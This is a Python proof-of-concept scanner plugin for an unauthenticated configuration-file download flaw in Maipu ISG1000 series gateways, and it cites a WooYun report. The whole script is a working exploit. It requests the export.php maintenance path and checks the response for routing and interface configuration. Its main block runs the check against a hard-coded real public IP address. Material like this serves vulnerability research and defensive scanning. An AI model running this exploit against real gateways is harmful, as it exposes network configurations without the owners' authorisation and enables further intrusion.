#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  迈普ISG1000系列网关 未授权下载配置文件
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2014-079924

 
 
"""
import urlparse
import time

def assign(service, arg):
    if service == 'mpsec':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    payload = "system/maintenance/export.php?type=sc"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url )
    if 'interface eth0' in res and code ==200 and 'ip route' in res:
        security_hole(url)
    

    

if __name__ == '__main__':
    from dummy import *
    audit(assign('mpsec', 'https://61.143.203.86/')[1])